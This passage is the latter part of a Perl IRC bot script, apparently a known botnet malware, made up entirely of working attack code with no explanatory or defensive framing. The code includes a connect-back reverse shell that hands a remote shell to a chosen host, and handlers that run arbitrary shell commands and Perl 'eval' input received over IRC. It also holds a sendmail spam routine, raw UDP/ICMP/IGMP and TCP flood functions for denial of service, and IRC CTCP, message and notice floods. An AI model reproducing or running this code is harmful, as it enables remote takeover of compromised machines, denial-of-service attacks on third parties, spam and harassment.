        sendraw($IRC_cur_socket, "PRIVMSG $printl : [ConnectBack]Connecting to$host:$port ");
        socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
        connect(SOCKET, $paddr) or die "connect: $!";
        open(STDIN, ">&SOCKET");
        open(STDOUT, ">&SOCKET");
        open(STDERR, ">&SOCKET");
        system("$shell");
        close(STDIN);
        close(STDOUT);
        close(STDERR);
}
##############
if ($funcarg =~ /^mail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Mailer]Sending email to: [*]$3 ");
        $subject = $1;
        $sender = $2;
        $recipient = $3;
        @corpo = $4;
        $mailtype = "content-type: text/html";
        $sendmail = '/usr/sbin/sendmail';
        open (SENDMAIL, "| $sendmail -t");
        print SENDMAIL "$mailtype\n";
        print SENDMAIL "Subject: $subject\n";
        print SENDMAIL "From: $sender\n";
        print SENDMAIL "To: $recipient\n\n";
        print SENDMAIL "@corpo\n\n";
        close (SENDMAIL);
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [Mailer]Email Sended to: [*]$recipient ");
}




exit;
}
}



##############tcp flood 
if ($funcarg =~ /^ctcpflood (.*)/) {
    my $target = "$1";
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [IRCFlood]CTCP Flooding: [*]".$target." ");
        for (1..10) {
        sendraw($IRC_cur_socket, "PRIVMSG ".$target." :\001VERSION\001\n");
        sendraw($IRC_cur_socket, "PRIVMSG ".$target." :\001PING\001\n");
        }
}
##############
if ($funcarg =~ /^msgflood (.*)/) {
    my $target = "$1";
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [IRCFlood]MSG Flooding: [*]".$target." ");
    sendraw($IRC_cur_socket, "PRIVMSG ".$target." :0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...");
}
##############
if ($funcarg =~ /^noticeflood (.*)/) {
    my $target = "$1";
        sendraw($IRC_cur_socket, "PRIVMSG $printl : [IRCFlood]NOTICE Flooding: [*]".$target." ");
        for (1..2){
        sendraw($IRC_cur_socket, "NOTICE ".$target." :0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...");
        }
}
##############

##############
sub ircase {
my ($kem, $printl, $case) = @_;
   if ($case =~ /^join (.*)/) {
     j("$1");
   }
   elsif ($case =~ /^part (.*)/) {
      p("$1");
   }
   elsif ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
        for (my $ca = 1; $ca <= $1; $ca++ ) {
          p("$2");
          j("$2");
        }
      } else {
          p("$chan");
          j("$chan");
      }
   }
   elsif ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^voice/) {
      voice("$printl", "$kem") if $case eq "voice";
      $oarg = substr($case, 6);
      voice("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^devoice/) {
      devoice("$printl", "$kem") if $case eq "devoice";
      $oarg = substr($case, 8);
      devoice("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }
   elsif ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        msg("$2", "$3");
      }
   }
   elsif ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }
   elsif ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        ctcp("$2", "$3");
      }
   }
   elsif ($case =~ /^invite\s+(\S+) (.*)/) {
      invite("$1", "$2");
   }
   elsif ($case =~ /^newerver\s+(\S+)\s+(\S+)/) {
       conectar("$2", "$1", "6667");
   }
   elsif ($case =~ /^nick (.*)/) {
      nick("$1");
   }
   elsif ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }
   elsif ($case =~ /^eval (.*)/) {
      eval "$1";
   }
   elsif ($case =~ /^join\s+(\S+)\s+(\d+)/) {
    sleep int(rand($2));
    j("$1");
   }
   elsif ($case =~ /^part\s+(\S+)\s+(\d+)/) {
    sleep int(rand($2));
    p("$1");
   }
   elsif ($case =~ /^quit/) {
     quit();
   }
}
##############
sub shell {
my $printl=$_[0];
my $comando=$_[1];
if ($comando =~ /cd (.*)/) {
        chdir("$1") || msg("$printl", "No such file or directory");
        return;
} elsif ($pid = fork) {
        waitpid($pid, 0);
} else {
if (fork) {
        exit;
} else {
my @resp=`$comando 2>&1 3>&1`;
my $c=0;
foreach my $linha (@resp) {
  $c++;
  chop $linha;
  sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
  if ($c == "$linas_max") {
    $c=0;
    sleep $sleep;
  }
}
exit;
}
}
}
##############
sub udpflooder {
my $iaddr = inet_aton($_[0]);
my $msg = 'A' x $_[1];
my $ftime = $_[2];
my $cp = 0;
my (%pacotes);
        $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
        socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
        socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
        socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
        socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
        return(undef) if $cp == 4;
my $itime = time;
my ($cur_time);
        while ( 1 ) {
for (my $port = 1;
        $port <= 65000; $port++) {
        $cur_time = time - $itime;
last if $cur_time >= $ftime;
        send(SOCK1, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{igmp}++;
        send(SOCK2, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{udp}++;
        send(SOCK3, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{icmp}++;
        send(SOCK4, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{tcp}++;
for (my $pc = 3;
        $pc <= 255;$pc++) {
next if $pc == 6;
        $cur_time = time - $itime;
last if $cur_time >= $ftime;
        socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
        send(SOCK5, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{o}++;
}
}
last if $cur_time >= $ftime;
}
return($cur_time, %pacotes);
}
##############
sub tcpflooder {
my $itime = time;
my ($cur_time);
my ($ia,$pa,$proto,$j,$l,$t);
        $ia=inet_aton($_[0]);
        $pa=sockaddr_in($_[1],$ia);
        $ftime=$_[2];
        $proto=getprotobyname('tcp');
        $j=0;$l=0;
        $cur_time = time - $itime;
while ($l<1000){
        $cur_time = time - $itime;
last if $cur_time >= $ftime;
        $t="SOCK$l";
        socket($t,PF_INET,SOCK_STREAM,$proto);
        connect($t,$pa)||$j--;
        $j++;$l++;
}
        $l=0;
while ($l<1000){
        $cur_time = time - $itime;
last if $cur_time >= $ftime;
        $t="SOCK$l";
shutdown($t,2);
        $l++;
}
}
##############
sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}
sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}
sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}
sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}
sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}
sub voice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +v $_[1]");
}
sub devoice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -v $_[1]");
}
sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}
sub p { part(@_); }
sub part {sendraw("PART $_[0]");}
sub nick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}
sub quit {
  sendraw("QUIT :$_[0]");
  exit;
}
sub modo {
   return unless $#_ == 0;
   sendraw("MODE $_[0] $_[1]");
}
sub mode { modo(@_); }

sub invite {
   return unless $#_ == 1;
   sendraw("INVITE $_[1] $_[0]");
}

sub topico {
   return unless $#_ == 1;
   sendraw("TOPIC $_[0] $_[1]");
}
sub topic { topico(@_); }

sub away {
  sendraw("AWAY $_[0]");
}
sub back { away(); }

}

###################
##### [ EOF ] #####
###################
